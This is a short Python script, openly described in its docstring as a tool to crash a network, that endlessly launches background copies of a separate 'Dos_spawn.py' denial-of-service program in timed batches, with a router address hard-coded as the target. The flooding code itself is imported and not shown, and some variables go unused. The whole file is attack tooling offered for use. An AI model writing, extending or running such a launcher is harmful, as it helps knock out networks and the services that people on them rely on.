import os
import time
import random
import Dos_spawn

"""Infinitly spawns new versions of Dos_spawn, this
causes the network to crash."""

HOST = "192.168.1.1"



def main():
	counter = 0
	while True:
		for x in range(1, 20):
			spawn_dos()
			time.sleep(1)

		time.sleep(45)


def spawn_dos():
	# does a system call to spawn new ones in background
	os.system("python Dos_spawn.py &")

if __name__ == "__main__":
	main()